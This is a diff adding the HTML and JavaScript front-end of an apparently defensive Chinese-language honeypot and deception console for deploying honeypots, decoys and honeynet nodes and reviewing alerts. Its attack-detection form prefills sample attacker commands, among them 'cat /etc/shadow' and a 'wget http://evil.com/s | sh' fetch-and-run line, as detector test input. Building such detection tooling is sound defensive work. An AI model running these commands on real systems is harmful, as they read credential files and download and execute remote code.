@@ -1,0 +1,732 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>蜜罐与欺骗技术控制台 — 第13轮升级</title>
+<style>
+:root {
+  --bg-primary: #0d1117;
+  --bg-secondary: #161b22;
+  --bg-tertiary: #21262d;
+  --border-color: #30363d;
+  --text-primary: #e6edf3;
+  --text-secondary: #8b949e;
+  --accent-blue: #58a6ff;
+  --accent-green: #3fb950;
+  --accent-yellow: #d29922;
+  --accent-red: #f85149;
+  --accent-purple: #bc8cff;
+  --accent-orange: #ffa657;
+  --radius: 8px;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Microsoft YaHei", sans-serif;
+  background: var(--bg-primary);
+  color: var(--text-primary);
+  line-height: 1.6;
+  min-height: 100vh;
+}
+.header {
+  background: linear-gradient(135deg, #1a1f2e 0%, #0d1117 100%);
+  border-bottom: 1px solid var(--border-color);
+  padding: 20px 30px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  gap: 10px;
+}
+.header h1 { font-size: 22px; font-weight: 600; color: var(--accent-purple); }
+.header h1 .icon { margin-right: 10px; }
+.header .badge {
+  background: var(--bg-tertiary);
+  border: 1px solid var(--border-color);
+  padding: 4px 12px;
+  border-radius: 20px;
+  font-size: 12px;
+  color: var(--text-secondary);
+}
+.tabs {
+  background: var(--bg-secondary);
+  border-bottom: 1px solid var(--border-color);
+  display: flex;
+  overflow-x: auto;
+  padding: 0 20px;
+}
+.tab-btn {
+  background: none;
+  border: none;
+  color: var(--text-secondary);
+  padding: 14px 18px;
+  cursor: pointer;
+  font-size: 14px;
+  border-bottom: 2px solid transparent;
+  transition: all 0.2s;
+  white-space: nowrap;
+}
+.tab-btn:hover { color: var(--text-primary); }
+.tab-btn.active {
+  color: var(--accent-purple);
+  border-bottom-color: var(--accent-purple);
+}
+.tab-content { display: none; padding: 24px; max-width: 1400px; margin: 0 auto; }
+.tab-content.active { display: block; }
+.card {
+  background: var(--bg-secondary);
+  border: 1px solid var(--border-color);
+  border-radius: var(--radius);
+  padding: 20px;
+  margin-bottom: 16px;
+}
+.card h3 {
+  font-size: 16px;
+  margin-bottom: 14px;
+  color: var(--text-primary);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.form-row { display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 12px; }
+.form-group { flex: 1; min-width: 180px; }
+.form-group label {
+  display: block;
+  font-size: 12px;
+  color: var(--text-secondary);
+  margin-bottom: 4px;
+}
+.form-group input, .form-group select, .form-group textarea {
+  width: 100%;
+  background: var(--bg-tertiary);
+  border: 1px solid var(--border-color);
+  border-radius: 6px;
+  padding: 8px 12px;
+  color: var(--text-primary);
+  font-size: 13px;
+  outline: none;
+}
+.form-group input:focus, .form-group select:focus {
+  border-color: var(--accent-blue);
+}
+.btn {
+  background: var(--accent-purple);
+  color: #fff;
+  border: none;
+  padding: 9px 18px;
+  border-radius: 6px;
+  cursor: pointer;
+  font-size: 13px;
+  font-weight: 500;
+  transition: opacity 0.2s;
+}
+.btn:hover { opacity: 0.85; }
+.btn-secondary { background: var(--bg-tertiary); color: var(--text-primary); border: 1px solid var(--border-color); }
+.btn-danger { background: var(--accent-red); }
+.btn-sm { padding: 5px 12px; font-size: 12px; }
+table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 13px;
+}
+th, td {
+  text-align: left;
+  padding: 10px 12px;
+  border-bottom: 1px solid var(--border-color);
+}
+th { color: var(--text-secondary); font-weight: 500; font-size: 12px; }
+tr:hover { background: var(--bg-tertiary); }
+.badge-tag {
+  display: inline-block;
+  padding: 2px 8px;
+  border-radius: 12px;
+  font-size: 11px;
+  font-weight: 500;
+}
+.tag-critical { background: rgba(248,81,73,0.15); color: var(--accent-red); }
+.tag-high { background: rgba(255,166,87,0.15); color: var(--accent-orange); }
+.tag-medium { background: rgba(210,153,34,0.15); color: var(--accent-yellow); }
+.tag-low { background: rgba(63,185,80,0.15); color: var(--accent-green); }
+.tag-running { background: rgba(63,185,80,0.15); color: var(--accent-green); }
+.tag-stopped { background: rgba(139,148,158,0.15); color: var(--text-secondary); }
+.stats-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+  gap: 14px;
+  margin-bottom: 16px;
+}
+.stat-card {
+  background: var(--bg-tertiary);
+  border: 1px solid var(--border-color);
+  border-radius: var(--radius);
+  padding: 16px;
+}
+.stat-card .stat-label { font-size: 12px; color: var(--text-secondary); }
+.stat-card .stat-value { font-size: 26px; font-weight: 600; margin-top: 4px; }
+.stat-card .stat-value.blue { color: var(--accent-blue); }
+.stat-card .stat-value.red { color: var(--accent-red); }
+.stat-card .stat-value.green { color: var(--accent-green); }
+.stat-card .stat-value.purple { color: var(--accent-purple); }
+.result-box {
+  background: var(--bg-primary);
+  border: 1px solid var(--border-color);
+  border-radius: 6px;
+  padding: 14px;
+  margin-top: 12px;
+  font-family: "Consolas", "Monaco", monospace;
+  font-size: 12px;
+  max-height: 400px;
+  overflow-y: auto;
+  white-space: pre-wrap;
+  word-break: break-all;
+}
+.empty-state {
+  text-align: center;
+  padding: 40px;
+  color: var(--text-secondary);
+  font-size: 14px;
+}
+.row-actions { display: flex; gap: 6px; flex-wrap: wrap; }
+.progress-bar {
+  height: 6px;
+  background: var(--bg-tertiary);
+  border-radius: 3px;
+  overflow: hidden;
+  margin-top: 6px;
+}
+.progress-fill { height: 100%; background: var(--accent-purple); transition: width 0.3s; }
+.maturity-dots { display: flex; gap: 4px; margin-top: 6px; }
+.maturity-dot {
+  width: 24px; height: 8px; border-radius: 2px; background: var(--bg-tertiary);
+}
+.maturity-dot.filled { background: var(--accent-purple); }
+@media (max-width: 768px) {
+  .header { padding: 14px 16px; }
+  .tab-content { padding: 14px; }
+  .stats-grid { grid-template-columns: repeat(2, 1fr); }
+}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1><span class="icon">&#128274;</span>蜜罐与欺骗技术控制台</h1>
+  <div>
+    <span class="badge">第13轮升级</span>
+    <span class="badge" style="margin-left:6px;">防御/检测/研究视角</span>
+  </div>
+</div>
+
+<div class="tabs">
+  <button class="tab-btn active" data-tab="honeypot">蜜罐管理</button>
+  <button class="tab-btn" data-tab="attack">攻击检测</button>
+  <button class="tab-btn" data-tab="intel">威胁情报</button>
+  <button class="tab-btn" data-tab="decoy">诱饵面包屑</button>
+  <button class="tab-btn" data-tab="honeynet">蜜网分布式</button>
+  <button class="tab-btn" data-tab="ops">综合运营</button>
+</div>
+
+<!-- ==================== 蜜罐管理 ==================== -->
+<div class="tab-content active" id="tab-honeypot">
+  <div class="stats-grid">
+    <div class="stat-card"><div class="stat-label">总实例</div><div class="stat-value purple" id="hp-total">0</div></div>
+    <div class="stat-card"><div class="stat-label">运行中</div><div class="stat-value green" id="hp-running">0</div></div>
+    <div class="stat-card"><div class="stat-label">总连接</div><div class="stat-value blue" id="hp-conns">0</div></div>
+    <div class="stat-card"><div class="stat-label">类型数</div><div class="stat-value" id="hp-types">0</div></div>
+  </div>
+
+  <div class="card">
+    <h3>&#9889; 部署新蜜罐</h3>
+    <div class="form-row">
+      <div class="form-group">
+        <label>蜜罐类型</label>
+        <select id="hp-type">
+          <option value="web_http">Web蜜罐(HTTP)</option>
+          <option value="ssh">SSH蜜罐</option>
+          <option value="mysql">MySQL蜜罐</option>
+          <option value="redis">Redis蜜罐</option>
+          <option value="smb">SMB蜜罐</option>
+          <option value="ftp">FTP蜜罐</option>
+          <option value="telnet">Telnet蜜罐</option>
+          <option value="rdp">RDP蜜罐</option>
+          <option value="mqtt">MQTT IoT蜜罐</option>
+          <option value="modbus">Modbus工控蜜罐</option>
+        </select>
+      </div>
+      <div class="form-group"><label>名称（可选）</label><input id="hp-name" placeholder="自动命名"></div>
+      <div class="form-group"><label>端口（可选）</label><input id="hp-port" type="number" placeholder="默认端口"></div>
+      <div class="form-group">
+        <label>交互级别</label>
+        <select id="hp-level">
+          <option value="low">低交互</option>
+          <option value="medium" selected>中交互</option>
+          <option value="high">高交互</option>
+        </select>
+      </div>
+    </div>
+    <button class="btn" onclick="deployHoneypot()">部署蜜罐</button>
+    <button class="btn btn-secondary" onclick="loadHoneypotList()">刷新列表</button>
+  </div>
+
+  <div class="card">
+    <h3>&#128202; 蜜罐实例列表</h3>
+    <div id="hp-list"><div class="empty-state">暂无实例，点击上方部署</div></div>
+  </div>
+</div>
+
+<!-- ==================== 攻击检测 ==================== -->
+<div class="tab-content" id="tab-attack">
+  <div class="stats-grid">
+    <div class="stat-card"><div class="stat-label">总连接</div><div class="stat-value blue" id="at-conns">0</div></div>
+    <div class="stat-card"><div class="stat-label">总命令</div><div class="stat-value purple" id="at-cmds">0</div></div>
+    <div class="stat-card"><div class="stat-label">告警数</div><div class="stat-value red" id="at-alerts">0</div></div>
+    <div class="stat-card"><div class="stat-label">Critical</div><div class="stat-value red" id="at-crit">0</div></div>
+  </div>
+
+  <div class="card">
+    <h3>&#128027; 模拟攻击检测</h3>
+    <div class="form-row">
+      <div class="form-group"><label>攻击者IP</label><input id="at-ip" value="185.220.10.1"></div>
+      <div class="form-group" style="flex:2;"><label>命令（换行分隔）</label>
+        <textarea id="at-cmds-input" rows="3" placeholder="nmap -sV 10.0.0.0/24&#10;cat /etc/shadow&#10;wget http://evil.com/sh | sh">nmap -sV 10.0.0.0/24
+cat /etc/shadow
+wget http://evil.com/s | sh</textarea>
+      </div>
+    </div>
+    <button class="btn" onclick="runAttackDetect()">启动检测</button>
+    <button class="btn btn-secondary" onclick="loadAlerts()">刷新告警</button>
+    <button class="btn btn-secondary" onclick="rebuildChain()">重建攻击链</button>
+  </div>
+
+  <div class="card">
+    <h3>&#128680; 实时告警</h3>
+    <div id="at-alerts-list"><div class="empty-state">暂无告警</div></div>
+  </div>
+
+  <div class="card">
+    <h3>&#128260; 攻击链重建</h3>
+    <div id="at-chain"><div class="empty-state">点击"重建攻击链"查看</div></div>
+  </div>
+</div>
+
+<!-- ==================== 威胁情报 ==================== -->
+<div class="tab-content" id="tab-intel">
+  <div class="stats-grid">
+    <div class="stat-card"><div class="stat-label">攻击者数</div><div class="stat-value purple" id="ti-actors">0</div></div>
+    <div class="stat-card"><div class="stat-label">IOC数</div><div class="stat-value blue" id="ti-iocs">0</div></div>
+    <div class="stat-card"><div class="stat-label">样本数</div><div class="stat-value red" id="ti-samples">0</div></div>
+    <div class="stat-card"><div class="stat-label">平均威胁分</div><div class="stat-value orange" id="ti-score">0</div></div>
+  </div>
+
+  <div class="card">
+    <h3>&#129302; 生成攻击者画像</h3>
+    <div class="form-row">
+      <div class="form-group"><label>攻击者IP</label><input id="ti-ip" value="185.220.10.1"></div>
+      <div class="form-group"><label>攻击次数</label><input id="ti-count" type="number" value="25"></div>
+      <div class="form-group"><label>工具（逗号分隔）</label><input id="ti-tools" value="nmap,hydra,metasploit"></div>
+    </div>
+    <button class="btn" onclick="generateIntel()">生成情报</button>
+    <button class="btn btn-secondary" onclick="loadActors()">刷新攻击者</button>
+    <button class="btn btn-secondary" onclick="loadIocs()">查看IOC</button>
+    <button class="btn btn-secondary" onclick="exportIntel()">导出JSON</button>
+  </div>
+
+  <div class="card">
+    <h3>&#128101; 攻击者画像列表</h3>
+    <div id="ti-actors-list"><div class="empty-state">暂无画像</div></div>
+  </div>
+
+  <div class="card">
+    <h3>&#128273; 提取的IOC</h3>
+    <div id="ti-iocs-list"><div class="empty-state">暂无IOC</div></div>
+  </div>
+</div>
+
+<!-- ==================== 诱饵面包屑 ==================== -->
+<div class="tab-content" id="tab-decoy">
+  <div class="stats-grid">
+    <div class="stat-card"><div class="stat-label">诱饵总数</div><div class="stat-value purple" id="dc-total">0</div></div>
+    <div class="stat-card"><div class="stat-label">被访问</div><div class="stat-value green" id="dc-accessed">0</div></div>
+    <div class="stat-card"><div class="stat-label">检测事件</div><div class="stat-value red" id="dc-events">0</div></div>
+    <div class="stat-card"><div class="stat-label">路径数</div><div class="stat-value blue" id="dc-paths">0</div></div>
+  </div>
+
+  <div class="card">
+    <h3>&#127869; 创建诱饵</h3>
+    <div class="form-row">
+      <div class="form-group">
+        <label>诱饵类型</label>
+        <select id="dc-type">
+          <option value="fake_config">虚假配置文件(.env)</option>
+          <option value="fake_key_file">虚假密钥文件</option>
+          <option value="fake_document_word">诱饵Word文档</option>
+          <option value="fake_document_excel">诱饵Excel表格</option>
+          <option value="fake_db_finance">虚假财务数据</option>
+          <option value="fake_api_admin">虚假管理API</option>
+          <option value="fake_smb_share">虚假SMB共享</option>
+          <option value="fake_cloud_bucket">虚假云存储桶</option>
+        </select>
+      </div>
+      <div class="form-group"><label>名称（可选）</label><input id="dc-name" placeholder="自动命名"></div>
+    </div>
+    <button class="btn" onclick="createDecoy()">创建诱饵</button>
+    <button class="btn btn-secondary" onclick="loadDecoys()">刷新列表</button>
+    <button class="btn btn-secondary" onclick="loadDecoyDetections()">检测事件</button>
+  </div>
+
+  <div class="card">
+    <h3>&#128230; 诱饵列表</h3>
+    <div id="dc-list"><div class="empty-state">暂无诱饵</div></div>
+  </div>
+
+  <div class="card">
+    <h3>&#128065; 访问检测事件</h3>
+    <div id="dc-detections"><div class="empty-state">暂无事件</div></div>
+  </div>
+</div>
+
+<!-- ==================== 蜜网分布式 ==================== -->
+<div class="tab-content" id="tab-honeynet">
+  <div class="stats-grid">
+    <div class="stat-card"><div class="stat-label">总节点</div><div class="stat-value purple" id="hn-total">0</div></div>
+    <div class="stat-card"><div class="stat-label">在线</div><div class="stat-value green" id="hn-online">0</div></div>
+    <div class="stat-card"><div class="stat-label">区域</div><div class="stat-value blue" id="hn-regions">0</div></div>
+    <div class="stat-card"><div class="stat-label">代理规则</div><div class="stat-value" id="hn-proxies">0</div></div>
+  </div>
+
+  <div class="card">
+    <h3>&#127760; 部署蜜网节点</h3>
+    <div class="form-row">
+      <div class="form-group">
+        <label>节点类型</label>
+        <select id="hn-type">
+          <option value="honeypot_node">蜜罐节点</option>
+          <option value="edge_collector">边缘采集节点</option>
+          <option value="analysis_node">分析节点</option>
+          <option value="proxy_node">代理蜜罐节点</option>
+          <option value="cloud_elastic">云弹性蜜罐</option>
+        </select>
+      </div>
+      <div class="form-group"><label>区域</label><input id="hn-region" value="cn-east-1"></div>
+      <div class="form-group">
+        <label>网段</label>
+        <select id="hn-zone">
+          <option value="dmz">DMZ隔离区</option>
+          <option value="internal">内网区</option>
+          <option value="sensitive">敏感区</option>
+        </select>
+      </div>
+      <div class="form-group"><label>数量</label><input id="hn-count" type="number" value="1" min="1" max="10"></div>
+    </div>
+    <button class="btn" onclick="deployHoneynet()">部署节点</button>
+    <button class="btn btn-secondary" onclick="loadHoneynetNodes()">刷新节点</button>
+    <button class="btn btn-secondary" onclick="loadHoneynetHealth()">集群健康</button>
+    <button class="btn btn-secondary" onclick="loadHoneynetTopo()">查看拓扑</button>
+  </div>
+
+  <div class="card">
+    <h3>&#128279; 节点列表</h3>
+    <div id="hn-list"><div class="empty-state">暂无节点</div></div>
+  </div>
+
+  <div class="card">
+    <h3>&#128200; 集群健康</h3>
+    <div id="hn-health"><div class="empty-state">点击"集群健康"查看</div></div>
+  </div>
+</div>
+
+<!-- ==================== 综合运营 ==================== -->
+<div class="tab-content" id="tab-ops">
+  <div class="stats-grid">
+    <div class="stat-card"><div class="stat-label">捕获率</div><div class="stat-value green" id="op-capture">0%</div></div>
+    <div class="stat-card"><div class="stat-label">误报率</div><div class="stat-value red" id="op-fp">0%</div></div>
+    <div class="stat-card"><div class="stat-label">MTTD(秒)</div><div class="stat-value blue" id="op-mttd">0</div></div>
+    <div class="stat-card"><div class="stat-label">成熟度</div><div class="stat-value purple" id="op-maturity">-</div></div>
+  </div>
+
+  <div class="card">
+    <h3>&#127919; 运营评估</h3>
+    <div class="form-row">
+      <div class="form-group"><label>策略名称</label><input id="op-policy" value="2024欺骗策略"></div>
+      <div class="form-group"><label>目标</label><input id="op-goal" value="提升边界检测覆盖率"></div>
+      <div class="form-group">
+        <label>演练场景</label>
+        <select id="op-scenario">
+          <option value="recon">侦察阶段</option>
+          <option value="initial_access">初始访问</option>
+          <option value="execution">执行阶段</option>
+          <option value="lateral">横向移动</option>
+        </select>
+      </div>
+    </div>
+    <button class="btn" onclick="runOpsAssess()">运行评估</button>
+    <button class="btn btn-secondary" onclick="loadOpsMetrics()">运营指标</button>
+    <button class="btn btn-secondary" onclick="loadOpsHistory()">历史记录</button>
+  </div>
+
+  <div class="card">
+    <h3>&#128202; 评估结果</h3>
+    <div id="op-result"><div class="empty-state">点击"运行评估"查看</div></div>
+  </div>
+
+  <div class="card">
+    <h3>&#127942; 成熟度模型</h3>
+    <div id="op-maturity-box"><div class="empty-state">运行评估后显示</div></div>
+  </div>
+</div>
+
+<script>
+const API = '/api/v1/deception';
+
+// Tab switching
+document.querySelectorAll('.tab-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+    btn.classList.add('active');
+    document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
+  });
+});
+
+async function api(path, method='GET', body=null) {
+  try {
+    const opt = { method, headers: {'Content-Type': 'application/json'} };
+    if (body) opt.body = JSON.stringify(body);
+    const r = await fetch(API + path, opt);
+    const j = await r.json();
+    return j;
+  } catch(e) { return { success:false, error: e.message }; }
+}
+
+function esc(s) { return String(s==null?'':s).replace(/[<>&"]/g, c => ({'<':'&lt;','>':'&gt;','&':'&amp;','"':'&quot;'}[c])); }
+function sevTag(s) { return `<span class="badge-tag tag-${esc(s)}">${esc(s)}</span>`; }
+
+// ===== Honeypot =====
+async function deployHoneypot() {
+  const body = {
+    honeypot_type: document.getElementById('hp-type').value,
+    name: document.getElementById('hp-name').value,
+    interaction_level: document.getElementById('hp-level').value,
+  };
+  const p = document.getElementById('hp-port').value;
+  if (p) body.listen_port = parseInt(p);
+  const r = await api('/honeypot/deploy', 'POST', body);
+  if (r.success) alert('部署成功: ' + (r.data.instance_id || ''));
+  else alert('失败: ' + r.error);
+  loadHoneypotList();
+}
+async function loadHoneypotList() {
+  const r = await api('/honeypot/list');
+  if (!r.success) return;
+  const d = r.data;
+  document.getElementById('hp-total').textContent = d.statistics.total_instances;
+  document.getElementById('hp-running').textContent = d.statistics.by_status.running || 0;
+  document.getElementById('hp-conns').textContent = d.statistics.total_connections;
+  document.getElementById('hp-types').textContent = Object.keys(d.statistics.by_type).length;
+  const el = document.getElementById('hp-list');
+  if (!d.instances.length) { el.innerHTML = '<div class="empty-state">暂无实例</div>'; return; }
+  el.innerHTML = '<table><tr><th>ID</th><th>名称</th><th>类型</th><th>端口</th><th>级别</th><th>状态</th><th>操作</th></tr>' +
+    d.instances.map(i => `<tr>
+      <td>${esc(i.instance_id)}</td><td>${esc(i.name)}</td><td>${esc(i.honeypot_type)}</td>
+      <td>${i.listen_port}</td><td>${esc(i.interaction_level)}</td>
+      <td>${i.status==='running'?'<span class="badge-tag tag-running">运行中</span>':'<span class="badge-tag tag-stopped">'+esc(i.status)+'</span>'}</td>
+      <td class="row-actions">
+        <button class="btn btn-sm" onclick="hpAction('${i.instance_id}','start')">启动</button>
+        <button class="btn btn-sm btn-secondary" onclick="hpAction('${i.instance_id}','stop')">停止</button>
+        <button class="btn btn-sm btn-danger" onclick="hpAction('${i.instance_id}','delete')">删除</button>
+      </td></tr>`).join('') + '</table>';
+}
+async function hpAction(id, act) {
+  if (act === 'delete') { await api('/honeypot/'+id, 'DELETE'); }
+  else { await api('/honeypot/'+id+'/'+act, 'POST'); }
+  loadHoneypotList();
+}
+
+// ===== Attack =====
+async function runAttackDetect() {
+  const cmds = document.getElementById('at-cmds-input').value.split('\n').filter(x=>x.trim());
+  const body = {
+    source_ip: document.getElementById('at-ip').value,
+    commands: cmds,
+    connections: [{source_port:12345,target_port:22,protocol:'TCP'}],
+    uploads: [{filename:'payload.sh',file_size:1024}],
+  };
+  const r = await api('/attack/detect', 'POST', body);
+  if (r.success) {
+    const tid = r.data.task_id;
+    setTimeout(async () => {
+      const res = await api('/attack/'+tid+'/results');
+      if (res.success) {
+        document.getElementById('at-chain').innerHTML = '<div class="result-box">'+esc(JSON.stringify(res.data, null, 2))+'</div>';
+      }
+      loadAlerts();
+    }, 500);
+  }
+}
+async function loadAlerts() {
+  const r = await api('/attack/alerts');
+  if (!r.success) return;
+  const a = r.data.alerts;
+  document.getElementById('at-alerts').textContent = a.length;
+  const crit = a.filter(x=>x.severity==='critical').length;
+  document.getElementById('at-crit').textContent = crit;
+  document.getElementById('at-conns').textContent = a.length;
+  const el = document.getElementById('at-alerts-list');
+  if (!a.length) { el.innerHTML='<div class="empty-state">暂无告警</div>'; return; }
+  el.innerHTML = '<table><tr><th>级别</th><th>类别</th><th>来源IP</th><th>描述</th><th>MITRE</th></tr>' +
+    a.slice(-15).map(x => `<tr><td>${sevTag(x.severity)}</td><td>${esc(x.category)}</td><td>${esc(x.source_ip)}</td><td>${esc(x.description)}</td><td>${esc(x.mitre_id)}</td></tr>`).join('') + '</table>';
+}
+async function rebuildChain() {
+  const r = await api('/attack/attack-chain?source_ip='+encodeURIComponent(document.getElementById('at-ip').value));
+  if (r.success) {
+    document.getElementById('at-chain').innerHTML = '<div class="result-box">'+esc(JSON.stringify(r.data, null, 2))+'</div>';
+  }
+}
+
+// ===== Threat Intel =====
+async function generateIntel() {
+  const body = {
+    source_ip: document.getElementById('ti-ip').value,
+    attack_count: parseInt(document.getElementById('ti-count').value),
+    tools: document.getElementById('ti-tools').value.split(',').map(s=>s.trim()),
+    commands: ['nmap -sV','cat /etc/shadow','ssh root@10.0.0.1'],
+  };
+  const r = await api('/threat/generate', 'POST', body);
+  if (r.success) {
+    setTimeout(() => { loadActors(); loadIocs(); }, 500);
+  }
+}
+async function loadActors() {
+  const r = await api('/threat/actors');
+  if (!r.success) return;
+  const a = r.data.actors;
+  document.getElementById('ti-actors').textContent = a.length;
+  document.getElementById('ti-score').textContent = a.length ? Math.round(a.reduce((s,x)=>s+x.threat_score,0)/a.length) : 0;
+  const el = document.getElementById('ti-actors-list');
+  if (!a.length) { el.innerHTML='<div class="empty-state">暂无画像</div>'; return; }
+  el.innerHTML = '<table><tr><th>IP</th><th>国家</th><th>ISP</th><th>类型</th><th>技能</th><th>威胁分</th><th>工具</th></tr>' +
+    a.map(x => `<tr><td>${esc(x.ip)}</td><td>${esc(x.country_name)}</td><td>${esc(x.isp)}</td><td>${esc(x.attacker_type)}</td><td>${esc(x.skill_level)}</td><td><b>${x.threat_score}</b></td><td>${esc(x.tools.join(', '))}</td></tr>`).join('') + '</table>';
+}
+async function loadIocs() {
+  const r = await api('/threat/iocs');
+  if (!r.success) return;
+  const i = r.data.iocs;
+  document.getElementById('ti-iocs').textContent = i.length;
+  const el = document.getElementById('ti-iocs-list');
+  if (!i.length) { el.innerHTML='<div class="empty-state">暂无IOC</div>'; return; }
+  el.innerHTML = '<table><tr><th>类型</th><th>值</th><th>置信度</th></tr>' +
+    i.slice(-20).map(x => `<tr><td>${esc(x.type)}</td><td style="word-break:break-all">${esc(x.value)}</td><td>${esc(x.confidence)}</td></tr>`).join('') + '</table>';
+}
+async function exportIntel() {
+  const r = await api('/threat/export?fmt=json');
+  if (r.success) {
+    document.getElementById('ti-actors-list').innerHTML = '<div class="result-box">'+esc(JSON.stringify(r.data.data, null, 2))+'</div>';
+  }
+}
+
+// ===== Decoy =====
+async function createDecoy() {
+  const body = { decoy_type: document.getElementById('dc-type').value, name: document.getElementById('dc-name').value };
+  const r = await api('/decoy/create', 'POST', body);
+  if (r.success) { alert('诱饵已创建: ' + r.data.decoy_id); loadDecoys(); }
+  else alert('失败: ' + r.error);
+}
+async function loadDecoys() {
+  const r = await api('/decoy/list');
+  if (!r.success) return;
+  const d = r.data;
+  document.getElementById('dc-total').textContent = d.statistics.total_decoys;
+  document.getElementById('dc-accessed').textContent = d.statistics.decoys_accessed;
+  document.getElementById('dc-events').textContent = d.statistics.total_detection_events;
+  document.getElementById('dc-paths').textContent = d.statistics.breadcrumb_paths;
+  const el = document.getElementById('dc-list');
+  if (!d.decoys.length) { el.innerHTML='<div class="empty-state">暂无诱饵</div>'; return; }
+  el.innerHTML = '<table><tr><th>ID</th><th>名称</th><th>类型</th><th>路径</th><th>敏感度</th><th>访问次数</th><th>操作</th></tr>' +
+    d.decoys.map(x => `<tr><td>${esc(x.decoy_id)}</td><td>${esc(x.name)}</td><td>${esc(x.decoy_type)}</td><td style="word-break:break-all">${esc(x.path)}</td><td>${sevTag(x.sensitivity)}</td><td>${x.accessed_count}</td><td><button class="btn btn-sm btn-danger" onclick="delDecoy('${x.decoy_id}')">删除</button></td></tr>`).join('') + '</table>';
+}
+async function delDecoy(id) { await api('/decoy/'+id, 'DELETE'); loadDecoys(); }
+async function loadDecoyDetections() {
+  const r = await api('/decoy/detections');
+  if (!r.success) return;
+  const el = document.getElementById('dc-detections');
+  if (!r.data.events.length) { el.innerHTML='<div class="empty-state">暂无事件</div>'; return; }
+  el.innerHTML = '<table><tr><th>时间</th><th>诱饵</th><th>来源IP</th><th>动作</th><th>级别</th></tr>' +
+    r.data.events.slice(-15).map(x => `<tr><td>${esc(x.timestamp)}</td><td>${esc(x.decoy_name)}</td><td>${esc(x.source_ip)}</td><td>${esc(x.action)}</td><td>${sevTag(x.alert_level)}</td></tr>`).join('') + '</table>';
+}
+
+// ===== Honeynet =====
+async function deployHoneynet() {
+  const body = {
+    node_type: document.getElementById('hn-type').value,
+    region: document.getElementById('hn-region').value,
+    zone: document.getElementById('hn-zone').value,
+    count: parseInt(document.getElementById('hn-count').value),
+  };
+  const r = await api('/honeynet/deploy', 'POST', body);
+  if (r.success) { alert('部署了 ' + r.data.count + ' 个节点'); loadHoneynetNodes(); }
+}
+async function loadHoneynetNodes() {
+  const r = await api('/honeynet/nodes');
+  if (!r.success) return;
+  const n = r.data.nodes;
+  const h = r.data.health;
+  document.getElementById('hn-total').textContent = h.total_nodes;
+  document.getElementById('hn-online').textContent = h.online_nodes;
+  document.getElementById('hn-regions').textContent = (h.regions_covered||[]).length;
+  const el = document.getElementById('hn-list');
+  if (!n.length) { el.innerHTML='<div class="empty-state">暂无节点</div>'; return; }
+  el.innerHTML = '<table><tr><th>ID</th><th>名称</th><th>类型</th><th>区域</th><th>网段</th><th>状态</th><th>CPU%</th><th>连接数</th></tr>' +
+    n.map(x => `<tr><td>${esc(x.node_id)}</td><td>${esc(x.name)}</td><td>${esc(x.node_type)}</td><td>${esc(x.region)}</td><td>${esc(x.zone)}</td><td>${esc(x.status)}</td><td>${x.cpu_usage}</td><td>${x.connections}</td></tr>`).join('') + '</table>';
+}
+async function loadHoneynetHealth() {
+  const r = await api('/honeynet/health');
+  if (!r.success) return;
+  document.getElementById('hn-health').innerHTML = '<div class="result-box">'+esc(JSON.stringify(r.data, null, 2))+'</div>';
+}
+async function loadHoneynetTopo() {
+  const r = await api('/honeynet/topology');
+  if (r.success) {
+    document.getElementById('hn-health').innerHTML = '<div class="result-box">'+esc(JSON.stringify(r.data, null, 2))+'</div>';
+  }
+}
+
+// ===== Operations =====
+async function runOpsAssess() {
+  const body = {
+    policy_name: document.getElementById('op-policy').value,
+    goal: document.getElementById('op-goal').value,
+    scenario: document.getElementById('op-scenario').value,
+  };
+  const r = await api('/operations/assess', 'POST', body);
+  if (r.success) {
+    const tid = r.data.task_id;
+    setTimeout(async () => {
+      const res = await api('/operations/'+tid+'/results');
+      if (res.success) {
+        document.getElementById('op-result').innerHTML = '<div class="result-box">'+esc(JSON.stringify(res.data, null, 2))+'</div>';
+        loadOpsMetrics();
+      }
+    }, 500);
+  }
+}
+async function loadOpsMetrics() {
+  const r = await api('/operations/metrics');
+  if (!r.success) return;
+  const e = r.data.effectiveness;
+  document.getElementById('op-capture').textContent = (e.capture_rate*100).toFixed(0)+'%';
+  document.getElementById('op-fp').textContent = (e.false_positive_rate*100).toFixed(0)+'%';
+  document.getElementById('op-mttd').textContent = e.mttd_seconds;
+  document.getElementById('op-maturity').textContent = r.data.maturity_level;
+}
+async function loadOpsHistory() {
+  const r = await api('/operations/history');
+  if (r.success) {
+    document.getElementById('op-result').innerHTML = '<div class="result-box">'+esc(JSON.stringify(r.data, null, 2))+'</div>';
+  }
+}
+
+// Init
+loadHoneypotList();
+</script>
+</body>
+</html>
